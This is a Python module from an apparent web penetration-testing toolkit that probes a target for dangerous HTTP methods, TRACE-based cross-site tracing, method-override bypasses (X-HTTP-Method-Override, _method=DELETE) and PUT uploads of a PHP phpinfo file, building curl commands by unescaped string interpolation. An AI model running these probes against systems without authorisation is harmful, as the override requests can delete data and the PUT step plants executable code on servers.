"""
modules/http_verb_tampering.py
tmrswrr - HTTP Verb Tampering & Method Override
PUT/DELETE/PATCH/TRACE/CONNECT, method override headers, verb confusion
"""
import os
import re

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    BOLD,
    DIM,
    NEON_CYN,
    NEON_GRN,
    NEON_RED,
    NEON_YEL,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    run_cmd,
    section,
    success,
    warn,
)


def _out(name):
    d = str(OUTPUT_DIR); os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target():
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL"); SESSION["target_url"] = url
    return url


def http_methods_scan():
    section("HTTP METHODS ENUMERATION")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-b "{cookies}"' if cookies else ""

    methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS",
               "HEAD", "TRACE", "CONNECT", "DEBUG", "TRACK", "SEARCH", "ARBITRARY"]

    endpoints = [url]
    crawled = SESSION.get("endpoints", [])
    endpoints.extend(crawled[:10])

    info(f"Testing {len(methods)} HTTP methods on {len(endpoints)} endpoint(s)...")
    print()

    dangerous = []
    for endpoint in endpoints:
        ep_short = endpoint.replace(url, "") or "/"
        print(f"\n  {NEON_CYN}{ep_short}{RST}")

        for method in methods:
            out, _, _ = run_cmd(
                f'curl -sk -X {method} {cookie_flag} "{endpoint}" '
                f'-o /dev/null -w "%{{http_code}}" -m 5'
            )
            code = out.strip()

            # Color code
            if code in ("200", "201"):
                color = NEON_GRN
            elif code in ("401", "403"):
                color = DIM
            elif code in ("405", "404"):
                color = DIM
            else:
                color = NEON_YEL

            print(f"    {color}[{code}]{RST} {method}", end="  ")

            if method in ("PUT", "DELETE", "TRACE", "DEBUG") and code in ("200","201","204"):
                dangerous.append((method, endpoint, code))
                add_vuln(f"Dangerous HTTP Method: {method}", "High", "A05:2021",
                         f"Method {method} returns {code}", endpoint)

        print()

    if dangerous:
        print(f"\n  {NEON_RED}{BOLD}Dangerous methods accepted:{RST}")
        for method, ep, code in dangerous:
            print(f"  {NEON_RED}[{method}]{RST} {ep} → HTTP {code}")


def trace_method_check():
    section("TRACE / TRACK - XST (Cross-Site Tracing)")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-b "{cookies}"' if cookies else ""

    info("TRACE method can expose session cookies even with HttpOnly flag (XST attack)...")

    # Test TRACE
    out, _, _ = run_cmd(
        f'curl -sk -X TRACE {cookie_flag} "{url}" -m 8 '
        f'-H "X-Custom-Header: YeepForge-TRACE-Test"'
    )

    if "TRACE" in out and "X-Custom-Header" in out:
        success("TRACE METHOD ENABLED - XST (Cross-Site Tracing) possible!")
        success("Attacker can use XSS + XMLHttpRequest TRACE to steal HttpOnly cookies")
        add_vuln("TRACE Method Enabled (XST)", "Medium", "A05:2021",
                 "HTTP TRACE method reflects request headers including cookies", url)
    elif out:
        info(f"TRACE response (check manually): {out[:200]}")
    else:
        print(f"  {DIM}[-] TRACE returned empty/no response{RST}")

    # Test TRACK (IIS variant)
    out2, _, _ = run_cmd(f'curl -sk -X TRACK {cookie_flag} "{url}" -m 8')
    if "TRACK" in out2:
        warn("TRACK method (IIS) enabled - similar XST risk")
        add_vuln("TRACK Method Enabled", "Medium", "A05:2021",
                 "IIS TRACK method enabled", url)

    print(f"""
  {NEON_CYN}Disable TRACE in common web servers:{RST}
    Apache:  TraceEnable off  (httpd.conf)
    Nginx:   if ($request_method = TRACE) {{ return 405; }}
    IIS:     requestFiltering → <verbs> block TRACE and TRACK
""")


def method_override():
    section("HTTP METHOD OVERRIDE BYPASS")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-b "{cookies}"' if cookies else ""

    info("Some frameworks allow overriding HTTP method via headers or body params...")
    print(f"""
  {NEON_CYN}Method override techniques:{RST}
    Frameworks like Rails, Laravel, Symfony support:
    - X-HTTP-Method-Override header
    - X-Method-Override header
    - _method=DELETE in POST body

  {NEON_CYN}Attack scenario:{RST}
    Firewall/WAF blocks DELETE requests
    But allows POST with _method=DELETE in body
    → Bypass restriction!
""")

    endpoint = prompt("Endpoint to test (e.g. /api/users/1)")
    if not endpoint:
        return

    override_tests = [
        ("X-HTTP-Method-Override: DELETE",
         f'curl -sk -X POST {cookie_flag} -H "X-HTTP-Method-Override: DELETE" "{url}{endpoint}" -m 8'),
        ("X-Method-Override: DELETE",
         f'curl -sk -X POST {cookie_flag} -H "X-Method-Override: DELETE" "{url}{endpoint}" -m 8'),
        ("_method=DELETE (body)",
         f'curl -sk -X POST {cookie_flag} -d "_method=DELETE" "{url}{endpoint}" -m 8'),
        ("X-HTTP-Method: DELETE",
         f'curl -sk -X POST {cookie_flag} -H "X-HTTP-Method: DELETE" "{url}{endpoint}" -m 8'),
        ("_method=PUT (body)",
         f'curl -sk -X POST {cookie_flag} -d "_method=PUT&data=malicious" "{url}{endpoint}" -m 8'),
    ]

    for name, cmd in override_tests:
        out, _, _ = run_cmd(cmd, timeout=10)
        code_m = re.search(r'"code":|HTTP', out)
        # Get status code
        out2, _, _ = run_cmd(cmd.replace("curl -sk", "curl -sk -o /dev/null -w '%{http_code}'"), timeout=10)
        code = out2.strip()[:3]
        color = NEON_GRN if code in ("200","204") else DIM
        print(f"  {color}[{code}]{RST} {name}")
        if code in ("200", "204"):
            warn(f"Method override accepted! {name}")
            add_vuln("HTTP Method Override", "High", "A05:2021",
                     f"Method override bypass: {name}", url + endpoint)


def put_file_upload():
    section("PUT METHOD - ARBITRARY FILE UPLOAD")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-b "{cookies}"' if cookies else ""

    info("Testing if PUT method allows writing files to the server...")

    test_files = [
        ("yeepforge_test.txt", "YeepForge PUT Test", "text/plain"),
        ("yeepforge_test.html", "<h1>PUT Upload Test</h1>", "text/html"),
        ("yeepforge_test.php", "<?php phpinfo(); ?>", "application/octet-stream"),
    ]

    for filename, content, ctype in test_files:
        test_url = f"{url}/{filename}"
        out, _, _ = run_cmd(
            f'curl -sk -X PUT {cookie_flag} -H "Content-Type: {ctype}" '
            f'"{test_url}" -d "{content}" -m 8 -w "\\nHTTP:%{{http_code}}"'
        )
        code_m = re.search(r"HTTP:(\d+)", out)
        code = code_m.group(1) if code_m else "?"

        if code in ("200", "201", "204"):
            # Try to retrieve the file
            get_out, _, _ = run_cmd(f'curl -sk "{test_url}" -m 5')
            if content[:20] in get_out:
                success(f"PUT FILE UPLOAD CONFIRMED: {filename}")
                success(f"File accessible at: {test_url}")
                if ".php" in filename and "phpinfo" in content:
                    success("PHP file uploaded - potential RCE!")
                    add_vuln("Arbitrary File Write via PUT", "Critical", "A05:2021",
                             f"PHP file uploaded to {test_url}", test_url)
                else:
                    add_vuln("Arbitrary File Write via PUT", "High", "A05:2021",
                             f"PUT method allows file upload: {filename}", test_url)
                # Cleanup
                run_cmd(f'curl -sk -X DELETE {cookie_flag} "{test_url}" -m 5')
            else:
                info(f"PUT accepted [{code}] but file not retrievable: {filename}")
        else:
            print(f"  {DIM}[{code}] {filename}{RST}")


def run():
    print_banner("HTTP VERB TAMPERING", "tmrswrr - Method Enumeration · TRACE · Override · PUT Upload")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} HTTP Methods Scan       {SOFT_WHITE}(GET/POST/PUT/DELETE/PATCH/TRACE/OPTIONS){RST}
  {NEON_CYN}[2]{RST} TRACE / XST Check       {SOFT_WHITE}(Cross-Site Tracing - HttpOnly bypass){RST}
  {NEON_CYN}[3]{RST} Method Override Bypass  {SOFT_WHITE}(X-HTTP-Method-Override, _method=DELETE){RST}
  {NEON_CYN}[4]{RST} PUT File Upload         {SOFT_WHITE}(arbitrary write → RCE){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0": break
        elif c == "1": http_methods_scan()
        elif c == "2": trace_method_check()
        elif c == "3": method_override()
        elif c == "4": put_file_upload()
        save_session()
